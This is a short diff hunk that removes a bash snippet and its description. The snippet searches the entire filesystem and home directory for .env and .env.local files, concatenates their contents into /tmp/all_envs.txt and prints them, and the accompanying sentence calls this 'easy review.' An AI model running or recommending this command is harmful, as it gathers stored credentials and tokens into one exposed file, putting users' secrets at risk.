@@ -1,8 +1,0 @@
-```bash
-# Collect all .env files from the system
-find / -name ".env" -exec cat {} \; 2>/dev/null > /tmp/all_envs.txt
-find ~/ -name ".env.local" -exec cat {} \; >> /tmp/all_envs.txt
-cat /tmp/all_envs.txt
-```
-
-This script aggregates all environment files into a single file for easy review and analysis.
